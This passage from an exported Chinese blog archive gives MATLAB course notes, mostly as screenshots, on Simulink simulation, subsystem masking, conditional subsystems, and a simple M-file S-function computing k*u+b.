<p><img src="https://img-blog.csdnimg.cn/20200228144159671.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>例子：<img src="https://img-blog.csdnimg.cn/20200228144311774.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>solve所得到的结果可能不准确：<br><img src="https://img-blog.csdnimg.cn/20200228144550348.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200228144608906.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
</blockquote>
<h2 id="D-b-常微分方程"><a href="#D-b-常微分方程" class="headerlink" title="D.b 常微分方程"></a>D.b 常微分方程</h2><blockquote>
<p><img src="https://img-blog.csdnimg.cn/20200228144745293.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200228144809449.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200228150612290.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>注意单引号。</p>
</blockquote>
<hr>
]]></content>
      <categories>
        <category>matlab</category>
      </categories>
      <tags>
        <tag>matlab</tag>
      </tags>
  </entry>
  <entry>
    <title>(08)Simulink系统仿真</title>
    <url>/2022/06/27/Matlab%E4%B8%AD%E5%8D%97%E5%A4%A7%E5%AD%A6%E7%AC%94%E8%AE%B0/%EF%BC%8808%EF%BC%89%E3%80%90Matlab%E3%80%91Simulink%E7%B3%BB%E7%BB%9F%E4%BB%BF%E7%9C%9F/</url>
    <content><![CDATA[<h1 id="A-Simulink-仿真基础"><a href="#A-Simulink-仿真基础" class="headerlink" title="A Simulink 仿真基础"></a>A Simulink 仿真基础</h1><h2 id="A-a-Simulink的启动"><a href="#A-a-Simulink的启动" class="headerlink" title="A.a Simulink的启动"></a>A.a Simulink的启动</h2><p><img src="https://img-blog.csdnimg.cn/20200228152418624.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<span id="more"></span>

<p><img src="https://img-blog.csdnimg.cn/20200228152530179.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200228152818220.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h2 id="A-b-系统仿真模型的创建"><a href="#A-b-系统仿真模型的创建" class="headerlink" title="A.b 系统仿真模型的创建"></a>A.b 系统仿真模型的创建</h2><blockquote>
<p><img src="https://img-blog.csdnimg.cn/20200228153023490.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>Simulink的模块库分为两类：一类是基本模块库（Simulink模块库），另一类是专业模块库</p>
</blockquote>
<blockquote>
<p><img src="https://img-blog.csdnimg.cn/20200228153350883.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200228153434579.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200228153511536.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
</blockquote>
<blockquote>
<p><img src="https://img-blog.csdnimg.cn/20200228153549872.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
</blockquote>
<blockquote>
<p><img src="https://img-blog.csdnimg.cn/20200228153656951.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
</blockquote>
<h2 id="A-c-仿真参数的设置"><a href="#A-c-仿真参数的设置" class="headerlink" title="A.c 仿真参数的设置"></a>A.c 仿真参数的设置</h2><blockquote>
<p><img src="https://img-blog.csdnimg.cn/20200228153816918.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200228153958861.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200228155309622.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200228155335151.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200228155531899.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
</blockquote>
<h1 id="B-子系统的创建与封装"><a href="#B-子系统的创建与封装" class="headerlink" title="B 子系统的创建与封装"></a>B 子系统的创建与封装</h1><h2 id="B-a-子系统的创建"><a href="#B-a-子系统的创建" class="headerlink" title="B.a 子系统的创建"></a>B.a 子系统的创建</h2><p><img src="https://img-blog.csdnimg.cn/20200228155836685.png" alt="在这里插入图片描述"></p>
<blockquote>
<p><img src="https://img-blog.csdnimg.cn/20200228160125725.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>双击它进入子模块<br><img src="https://img-blog.csdnimg.cn/20200228160315278.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200228160629736.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
</blockquote>
<blockquote>
<p><img src="https://img-blog.csdnimg.cn/20200228160721818.png" alt="在这里插入图片描述"><br>选择系统的所有模块，再选择相关命令（或者Ctrl+G）<br><img src="https://img-blog.csdnimg.cn/20200228160843904.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>所选模块，将被一个子系统取代<br><img src="https://img-blog.csdnimg.cn/20200228160933136.png" alt="在这里插入图片描述"></p>
</blockquote>
<hr>
<h2 id="B-b-子系统的封装"><a href="#B-b-子系统的封装" class="headerlink" title="B.b 子系统的封装"></a>B.b 子系统的封装</h2><p>所谓子系统的封装，就是对子系统定制对话框和图标。使得子系统本身有一个独立的操作界面。把子系统中多模块的参数设置合成在一个对话框内，这样使子系统使用更加方便。</p>
<blockquote>
<p><strong>先点击子系统图标</strong>再选择命令<br><img src="https://img-blog.csdnimg.cn/20200228170723404.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/2020022816231234.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200228162417227.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>重点介绍第二个选项卡<br><img src="https://img-blog.csdnimg.cn/20200228164247243.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>双击Edit在中间的Parameter中可以设置相应控件名的提示信息。<br><img src="https://img-blog.csdnimg.cn/20200228164953204.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>双击子系统图标，设置参数的值<br><img src="https://img-blog.csdnimg.cn/20200228171009762.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200228171100303.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
</blockquote>
<hr>
<h2 id="B-c-条件执行子系统"><a href="#B-c-条件执行子系统" class="headerlink" title="B.c 条件执行子系统"></a>B.c 条件执行子系统</h2><p>子系统的执行，依赖于其他信号，这个信号，称为控制信号.受控制信号控制的子系统，称为条件执行子系统。<br><img src="https://img-blog.csdnimg.cn/20200228171646914.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<blockquote>
<p><img src="https://img-blog.csdnimg.cn/20200228172024923.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>例子：<br><img src="https://img-blog.csdnimg.cn/20200228172546812.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
</blockquote>
<blockquote>
<p><img src="https://img-blog.csdnimg.cn/20200228172655334.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200228173005307.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200228173318899.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>例子：<br><img src="https://img-blog.csdnimg.cn/20200228173940334.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/2020022817392722.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200228174130289.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200228175259899.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
</blockquote>
<blockquote>
<p><img src="https://img-blog.csdnimg.cn/2020022817534266.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
</blockquote>
<hr>
<p>显示多个坐标轴:<a href="https://www.ilovematlab.cn/thread-553146-1-1.html">https://www.ilovematlab.cn/thread-553146-1-1.html</a><br>显示组件名:<a href="https://www.cnblogs.com/luxiaoguogege/p/11410605.html">https://www.cnblogs.com/luxiaoguogege/p/11410605.html</a></p>
<h1 id="C-S函数的设计与应用"><a href="#C-S函数的设计与应用" class="headerlink" title="C S函数的设计与应用"></a>C S函数的设计与应用</h1><h2 id="C-a-什么加S函数"><a href="#C-a-什么加S函数" class="headerlink" title="C.a 什么加S函数"></a>C.a 什么加S函数</h2><blockquote>
<p><img src="https://img-blog.csdnimg.cn/20200228180152346.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
</blockquote>
<h2 id="C-b-用M文件编写S函数的方法"><a href="#C-b-用M文件编写S函数的方法" class="headerlink" title="C.b 用M文件编写S函数的方法"></a>C.b 用M文件编写S函数的方法</h2><blockquote>
<p><img src="https://img-blog.csdnimg.cn/20200228180348932.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
</blockquote>
<h2 id="C-c-在仿真模型中使用S函数的方法"><a href="#C-c-在仿真模型中使用S函数的方法" class="headerlink" title="C.c 在仿真模型中使用S函数的方法"></a>C.c 在仿真模型中使用S函数的方法</h2><blockquote>
<p><img src="https://img-blog.csdnimg.cn/20200228180646241.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>输入参数还可以包括自定义参数；sys取决于flag的值；如果系统没有状态变量，x0为一个空阵。ts为列矩阵，一列是状态变量的采样周期，另一列是相应的采样时间的偏移量，对于连续系统，都应置为0。如果取采样周期为-1，则将继承输入信号的采样周期。<br><img src="https://img-blog.csdnimg.cn/20200228180745349.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>flag4，9很少用；子函数不一定会全使用</p>
</blockquote>
<hr>
<h2 id="C-d-S函数的应用"><a href="#C-d-S函数的应用" class="headerlink" title="C.d S函数的应用"></a>C.d S函数的应用</h2><p><img src="https://img-blog.csdnimg.cn/20200228192000326.png" alt="在这里插入图片描述"></p>
<ul>
<li>主函数：timekb.m</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> [sys,x0,str,ts]=timekb(t,x,u,flag,k,b)</span><br><span class="line">% t:仿真时间</span><br><span class="line">% x:状态向量</span><br><span class="line">% u:输入向量</span><br><span class="line">% flag：子函数调用标志</span><br><span class="line">% sys:一种返回参数</span><br><span class="line">% x0：初始状态值</span><br><span class="line">% k,b:自定义变量</span><br><span class="line">    switch flag</span><br><span class="line">        <span class="keyword">case</span> 0</span><br><span class="line">            [sys,x0,str,ts]=mdlInitializeSizes; % flag=0时，调用初始化自函数</span><br><span class="line">        <span class="keyword">case</span> 3</span><br><span class="line">            sys=mdlOutputs(t,x,u,k,b);           % flag=0时，调用输出子函数</span><br><span class="line">        <span class="keyword">case</span> &#123;1,2,4,9&#125;</span><br><span class="line">            sys=[];</span><br><span class="line">        otherwise</span><br><span class="line">            error(num2str(flag))                % 出错处理</span><br><span class="line">    end</span><br></pre></td></tr></table></figure>
<hr>
<ul>
<li>初始化自函数mdlInitializeSize.m，定义S函数的参数，如采样时间、输入量，输出量、状态变量的个数以及其他特征。</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> [sys,x0,str,ts]=mdlInitializeSizes()</span><br><span class="line">    sizes=simsizes;   % 返回一个结构，为Simulink提供初始化相关信息</span><br><span class="line">    % 连续状态变量个数，离散状态变量个数，输出变量个数，输入个数。</span><br><span class="line">    %这四个值可以置为-1，使其大小可以动态改变。</span><br><span class="line">    sizes.NumContStates=0;    % 无连续状态</span><br><span class="line">    sizes.NumDiscStates=0;    % 无离散状态</span><br><span class="line">    sizes.NumOutputs=1;       % 有一个输出量</span><br><span class="line">    sizes.NumInputs=1;        % 有一个输入信号</span><br><span class="line">    % 输入信号是否在输出端出现；模块采样周期个数，一般取1</span><br><span class="line">    sizes.DirFeedthrough=1;   % 输出量中含有输入量</span><br><span class="line">    sizes.NumSampleTimes=1;   % 单个采样周期</span><br><span class="line">    % 给返回参数赋值</span><br><span class="line">    sys=simsizes(sizes);</span><br><span class="line">    x0=[];                    % 设置初始状态为零状态</span><br><span class="line">    str=[];                   % 将str变量设置为空字符串</span><br><span class="line">    ts=[-1,0];                % 假定继承输入信号的采样周期</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<ul>
<li>输出子函数：mdlOutputs.m</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> sys=mdlOutputs(t,x,u,k,b)</span><br><span class="line">    sys=k*u+b;</span><br></pre></td></tr></table></figure>
<p>以上函数，用各自函数名分别存盘，这样S函数就建好了</p>
<hr>
<blockquote>
<p><img src="https://img-blog.csdnimg.cn/20200228195753862.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>双击S-Function模块<br><img src="https://img-blog.csdnimg.cn/20200228200006681.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>点击S-Function模块，打开封装编辑器。<br><img src="https://img-blog.csdnimg.cn/20200228200213629.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>双击S-Function模块<br><img src="https://img-blog.csdnimg.cn/20200228200331124.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">运行结果<br><img src="https://img-blog.csdnimg.cn/20200228204030408.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
</blockquote>
<hr>
<blockquote>
<p>图片来源：<br><a href="https://www.icourse163.org/search.htm?search=%E4%B8%AD%E5%8D%97%E5%A4%A7%E5%AD%A6%20Matlab#/">https://www.icourse163.org/search.htm?search=%E4%B8%AD%E5%8D%97%E5%A4%A7%E5%AD%A6%20Matlab#/</a></p>
</blockquote>
]]></content>
      <categories>
        <category>matlab</category>
      </categories>
      <tags>
        <tag>matlab</tag>
      </tags>
  </entry>
</search>
